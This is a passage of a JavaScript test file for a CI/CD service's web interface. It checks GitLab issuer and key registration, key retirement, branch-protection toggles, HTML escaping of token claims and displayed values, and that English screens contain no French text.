  answers = { "POST /api/v0/issuers/preview": { body: preview }, "POST /api/v0/issuers": { status: 201, body: { id: REG, issuer: preview.issuer, audience: ISSUER.audience, kid: THUMB, thumbprint: THUMB } } };
  await submit(form(JSON.stringify(JWKS)));
  assert.deepEqual(calls, [{ method: "POST", path: "/api/v0/issuers/preview", body: { issuer: "https://gitlab.example.test", keys: JWKS, kid: THUMB } }], "the preview writes nothing and asks no passkey");
  const shown = viewAcces("instance").html;
  assert.ok(shown.includes(`<code translate="no" data-thumbprint>${THUMB}</code>`) && shown.includes('<code translate="no">https://gitlab.example.test</code>') && shown.includes("RSA, 2048 bits"));
  assert.ok(shown.includes('data-do="gesture" data-k="issuer"') && !shown.includes("<form"), "the values, then the gesture");
  calls.length = 0;
  await click("gesture", "issuer");
  assert.deepEqual(gestures(), [{ gesture: "issuer-register", object: DIGEST }]);
  assert.deepEqual(wrote(), [{ method: "POST", path: "/api/v0/issuers", body: { issuer: "https://gitlab.example.test", keys: JWKS, kid: THUMB, digest: DIGEST } }]);
  // a key added to a registration
  state({ lang: "en" });
  answers = { [`POST /api/v0/issuers/${REG}/keys/preview`]: { body: { kid: THUMB, thumbprint: THUMB, bits: 4096, digest: "a".repeat(64) } } };
  await submit(form(JSON.stringify(JWKS), REG));
  assert.deepEqual(calls[0], { method: "POST", path: `/api/v0/issuers/${REG}/keys/preview`, body: { keys: JWKS, kid: THUMB } });
  calls.length = 0;
  await click("gesture", "issuer");
  assert.deepEqual(gestures(), [{ gesture: "issuer-key-add", object: "a".repeat(64) }]);
  assert.deepEqual(wrote(), [{ method: "POST", path: `/api/v0/issuers/${REG}/keys`, body: { keys: JWKS, kid: THUMB, digest: "a".repeat(64) } }]);
  // a refusal: under its field, with the service's detail, escaped
  state({ lang: "en" });
  answers = { "POST /api/v0/issuers/preview": { status: 400, body: { refusal: "key-malformed", message: "This key is not an RSA public key the service admits.", action: "Paste the key set.", why: "modulus of <b>1024</b> bits" } } };
  await submit(form(JSON.stringify(JWKS)));
  const refused = viewAcces("instance").html;
  assert.ok(refused.includes('id="e-keys"') && refused.includes("modulus of &lt;b&gt;1024&lt;/b&gt; bits") && !refused.includes("<b>1024</b>"));
  assert.equal(viewAcces(`instance/${"f".repeat(32)}`), null, "an unknown registration is an unknown address");
});

test("Access lists the registrations: issuer, audience, each key's thumbprint, state and expiry; a key retired and a registration removed are gestures bound to their identifier", async () => {
  const soon = key({ id: "22222222-2222-4333-8444-555555555555", kid: "soon", expiresSoon: true });
  const retired = key({ id: "33333333-2222-4333-8444-555555555555", kid: "old", state: "retired", retiredAt: "2026-11-05T10:00:00.000Z" });
  state({ lang: "en", access: access({ issuers: [{ ...ISSUER, issuer: "https://gitlab.example.test/<i>", keys: [key(), soon, retired] }, { ...ISSUER, id: "f".repeat(32), receiving: false, keys: [retired] }] }) });
  const html = viewAcces("").html, I = Lx.MOTS.en.forge.instances;
  assert.ok(html.includes("https://gitlab.example.test/&lt;i&gt;") && !html.includes("<i>"), "the issuer, escaped");
  assert.ok(html.includes(`id="aud-i-${REG}">https://app.runward.dev/send/${REG}</code>`) && html.includes(`data-copy-target="aud-i-${REG}" data-copy-plain data-copy-audience`), "the audience, with its copy button");
  assert.ok(html.includes(`<code translate="no">${THUMB}</code>`) && html.includes('datetime="2027-11-01T10:00:00.000Z"'), "a key's thumbprint and its expiry");
  assert.ok(text(html).includes(I.expiresSoon) && text(html).includes(`${I.receivesNothing} ${I.receivesNothingText}`), "a key that expires soon, a registration that receives nothing");
  assert.ok(html.includes(`data-k="keyretire:${REG}.${KEY}"`) && !html.includes(`data-k="keyretire:${REG}.${retired.id}"`), "a live key can be retired, a retired one cannot");
  // retiring says what it does before the gesture
  S.confirming = `keyretire:${REG}.${KEY}`;
  const box = text(confirmBox(S.confirming));
  for (const said of ["takes effect at once", "believe stolen", "no live key receives nothing"]) assert.ok(box.includes(said), said);
  await click("confirm", `keyretire:${REG}.${KEY}`);
  assert.deepEqual(gestures(), [{ gesture: "issuer-key-retire", object: KEY }]);
  assert.deepEqual(wrote(), [{ method: "DELETE", path: `/api/v0/issuers/${REG}/keys/${KEY}`, body: {} }]);
  state({ lang: "en" });
  answers = { [`DELETE /api/v0/issuers/${REG}`]: { status: 409, body: { refusal: "issuer-in-use", message: "A repository is declared on this instance.", action: "Remove its repositories first." } } };
  S.confirming = `issuerremove:${REG}`;
  await click("confirm", `issuerremove:${REG}`);
  assert.deepEqual(gestures(), [{ gesture: "issuer-remove", object: REG }]);
  assert.ok(confirmBox(`issuerremove:${REG}`).includes("A repository is declared on this instance. Remove its repositories first."), "the refusal is said in the box");
});

test("a GitLab repository in Access: its issuer, its audience, the protection lifted and restored with the consequence said first, a definition no longer pinned with its remedy", async () => {
  state({ lang: "en", access: access({ repositories: [COM, { ...SELF, definitionPinned: false }, { ...COM, id: "r-b", level: "P3b", protectionRequired: false }] }) });
  const html = viewAcces("").html, G = Lx.MOTS.en.forge;
  assert.ok(html.includes('id="aud-r-r-com">https://app.runward.dev</code>') && html.includes(`id="aud-r-r-self">https://app.runward.dev/send/${REG}</code>`), "the audience each pipeline writes");
  assert.ok(html.includes('data-k="liftprot:r-com"') && html.includes('data-k="restoreprot:r-b"') && !html.includes('data-k="liftprot:r-self"'), "the protection is gitlab.com's requirement");
  assert.ok(html.includes("data-unpinned") && text(html).includes(G.depots.unpinned), "a definition no longer pinned, with its remedy");
  assert.ok(html.includes("<code>.gitlab-ci.yml</code> on <code>main</code>") && text(html).includes("pipeline definition"));
  // lifting: the P3b sentence is said before the gesture, the code after it
  S.confirming = "liftprot:r-com";
  const box = text(confirmBox("liftprot:r-com"));
  assert.ok(box.indexOf(G.level.P3b.proves) > 0 && box.indexOf(G.level.P3b.proves) < box.indexOf(G.level.P3b.not) && box.indexOf(G.level.P3b.not) < box.indexOf("level P3b"), "the sentence, then the code");
  await click("confirm", "liftprot:r-com");
  S.confirming = "restoreprot:r-b";
  await click("confirm", "restoreprot:r-b");
  assert.deepEqual(gestures(), [{ gesture: "protection-lift", object: "r-com" }, { gesture: "protection-restore", object: "r-b" }]);
  assert.deepEqual(wrote().map((c) => `${c.method} ${c.path}`), ["POST /api/v0/repositories/r-com/protection/lift", "POST /api/v0/repositories/r-b/protection/restore"]);
});

test("the claims of a GitLab upload are GitLab's, escaped, with no GitHub address; GitHub's are unchanged", () => {
  state({ lang: "en" });
  const c = { repository: "group/<b>p</b>", repositoryId: "42", repositoryOwnerId: "7", definitionRef: COM.definitionRef, definitionSha: "1445c1b", pipelineSource: "push", ref: "main", refType: "branch", refProtected: "true", sha: "1445c1b", pipelineId: "30", jobId: "300", userAccessLevel: 40, runnerId: 3, runnerEnvironment: "self-hosted", runId: "30", runNumber: "30", runAttempt: "300" };
  const html = claimsTable(c);
  for (const claim of ["project_path", "project_id", "namespace_id", "ci_config_ref_uri", "ci_config_sha", "pipeline_source", "ref_type", "ref_protected", "pipeline_id · job_id", "user_access_level", "runner_id", "runner_environment"]) assert.ok(html.includes(`<code>${claim}</code>`), claim);
  assert.ok(html.includes("group/&lt;b&gt;p&lt;/b&gt;") && !html.includes("<b>p</b>") && !html.includes("github.com") && !html.includes("workflow_ref"));
  const gh = claimsTable({ repository: "stranxik/demo", repositoryId: "1", repositoryOwnerId: "2", workflowRef: "w", jobWorkflowRef: "j", eventName: "push", ref: "refs/heads/main", sha: "s", runnerEnvironment: "github-hosted", runId: "5", runNumber: "1", runAttempt: "1" });
  assert.ok(gh.includes("<code>job_workflow_ref</code>") && gh.includes("https://github.com/stranxik/demo/actions/runs/5/attempts/1"));
  assert.ok(pinsTable({ definitionRef: null, projectPath: "a/<i>" }).includes("a/&lt;i&gt;"), "a pinned value is escaped");
});

// ------------------------------------------------------------------ the words
test("every journal kind and every refusal of the forge port has its words in both languages; every gesture the shell binds is one the service knows", () => {
  const KINDS_ADDED = ["issuer-registered", "issuer-key-added", "issuer-key-confirmed", "issuer-key-retired", "issuer-removed", "protection-lifted", "protection-restored", "order-epoch-opened"];
  // the refusals of an upload (401, 403) are named in a mission's line and in the journal: each has its line
  const upload = Object.keys(FORGE).filter((code) => [401, 403].includes(FORGE[code].status));
  assert.deepEqual(upload, ["token-too-old", "key-retired", "definition-absent", "definition-not-pinned", "commit-mismatch", "ref-not-declared", "ref-not-protected", "source-not-admitted"], "the guard must read the forge port's refusals");
  for (const lang of ["fr", "en"]) {
    for (const k of KINDS_ADDED) assert.ok(Lx.MOTS[lang].acts[k], `${lang} acts.${k}`);
    for (const code of upload) assert.ok(Lx.MOTS[lang].refusal[code], `${lang} refusal.${code}`);
    // the others are answered to a gesture of the shell, which shows the service's own text: each has one
    for (const code of Object.keys(FORGE)) assert.ok(FORGE[code][lang][0] && FORGE[code][lang][1], `${lang} ${code}: the service's text`);
    for (const kind of ["liftprot", "restoreprot", "epoch", "keyretire", "issuerremove"]) {
      const t = Lx.MOTS[lang].confirm.kinds[kind];
      assert.ok(t.q && t.d && t.b && Lx.MOTS[lang].done[kind], `${lang}: the confirmation of ${kind}, and what is announced`);
    }
  }
  for (const k of KINDS_ADDED) assert.notEqual(Lx.MOTS.fr.acts[k], Lx.MOTS.en.acts[k], `${k}: written in each language`);
  // the gestures: the confirmations' and the three made outside a confirmation box
  const bound = [...Object.values(KINDS).map((k) => k.g).filter(Boolean), "repository-confirm", "issuer-register", "issuer-key-add"];
  for (const g of bound) assert.ok(GESTURES.includes(g), `the service knows the gesture ${g}`);
  for (const g of ["issuer-register", "issuer-key-add", "issuer-key-retire", "issuer-remove", "protection-lift", "protection-restore", "order-epoch-open"]) assert.ok(bound.includes(g), `the shell makes the gesture ${g}`);
});

// French seen in what a reader reads (the detector of test/unit/frame-lang.test.js, the values in code set aside)
const FRENCH = /[àâçéèêëîïôûùüÿœæ«»]|\b(le|la|les|des|du|une|un|vous|votre|vos|est|et|pour|dans|sur|pas|ce|cette|qui|que|aucun|aucune|au|aux|ne|avec|sans|par|depuis|jusqu|envoi|envois|flotte|jeton|geste|retirer|remettre|rien|tout|toutes|tous|chaque|ici|encore)\b|\b(?:l|d|n|qu|s|c)['’][a-z]/i;
const frenchIn = (html) => text(String(html).replace(/<(code|pre|time)\b[^>]*>[\s\S]*?<\/\1>|<(\w+)\b[^>]*(?:translate="no"|data-verbatim)[^>]*>[\s\S]*?<\/\2>/g, " ").replace(/<[^>]+>/g, "\n")).split(/\n+/).filter((t) => FRENCH.test(t));

test("the forge port's screens painted in English carry no French word, and in French are French", () => {
  const pendingSend = { claims: { repository: "team/app", repositoryId: "42", repositoryOwnerId: "7", definitionRef: SELF.definitionRef, pipelineId: "30", jobId: "300" } };
  const toConfirm = { ...SELF, state: "pending", pendingSend, pending: { values: { forge: "gitlab", issuerKey: REG, projectId: "42", namespaceId: "7", projectPath: "team/app", definitionRef: null }, digest: DIGEST, confirmable: false } };
  const screens = (lang) => {
    const out = [];
    const paint = (name, over, view) => { state({ lang, ...over }); out.push([name, view()]); };
    paint("access", { access: access({ repositories: [COM, { ...SELF, definitionPinned: false }, { ...COM, id: "r-b", protectionRequired: false }], issuers: [{ ...ISSUER, receiving: false, keys: [key({ expiresSoon: true }), key({ id: "k2", state: "retired", retiredAt: "2026-11-05T10:00:00.000Z" }), key({ id: "k3", state: "expired" })] }] }) }, () => viewAcces("").html);
    paint("access, no instance", { access: access({ issuers: [], repositories: [] }) }, () => viewAcces("").html);
    paint("instance", {}, () => viewAcces("instance").html);
    paint("instance, previewed", { issuer: { id: "", values: { issuer: "i", keys: "{}", kid: "k" }, preview: { issuer: "i", kid: "k", thumbprint: "t", bits: 2048, digest: DIGEST }, error: { field: null, message: "Refused.", action: "Do this.", why: "detail" } } }, () => viewAcces("instance").html);
    paint("instance key", { issuer: { id: REG, values: { issuer: "", keys: "x", kid: "k" }, preview: null, error: { field: "keys", message: "Refused.", action: "Do this.", why: "detail" } } }, () => viewAcces(`instance/${REG}`).html);
    for (const forge of ["github", "gitlab.com", REG]) paint(`declare ${forge}`, { formValues: { forge, repo: "", wf: "", mission: "", path: ".", branch: "main" } }, () => viewDeclarer("").html);
    paint("pending", {}, () => viewDeclarer(`attente/${COM.id}`).html);
    paint("modify", {}, () => viewDeclarer(`modifier/${COM.id}`).html);
    paint("confirm", { access: access({ repositories: [toConfirm] }), failed: "confirm:r-self", stale: "r-self" }, () => viewDeclarer("confirmer/r-self").html);
    paint("confirm definition", { access: access({ repositories: [{ ...toConfirm, state: "pinned", pendingSend: { ...pendingSend, reason: "definition-not-pinned" } }] }) }, () => viewDeclarer("confirmer/r-self").html);
    paint("fleet", {}, () => viewFleet("vue", "").html);
    for (const l of LINES) paint(`level ${l.mission}`, {}, () => `${niveauLigne(l)}${ordre(l)}`);
    for (const k of ["liftprot", "restoreprot", "epoch", "keyretire", "issuerremove"]) paint(`confirm ${k}`, { confirming: `${k}:x` }, () => confirmBox(`${k}:x`));
    paint("claims", {}, () => claimsTable(pendingSend.claims));
    return out;
  };
  const en = screens("en");
  assert.ok(en.length >= 22, "the guard must see the screens");
  assert.deepEqual(en.flatMap(([name, html]) => frenchIn(html).map((t) => `${name}: ${t}`)), []);
  const quiet = screens("fr").filter(([name, html]) => name !== "claims" && !frenchIn(html).length).map(([name]) => name);
  assert.deepEqual(quiet, [], "in French, every screen is French");
  // planted control: a sentence left in French is found
  const was = Lx.MOTS.en.forge.instances.lede;
  Lx.MOTS.en.forge.instances.lede = Lx.MOTS.fr.forge.instances.lede;
  try { state({ lang: "en" }); assert.ok(frenchIn(viewAcces("").html).length > 0); } finally { Lx.MOTS.en.forge.instances.lede = was; }
});
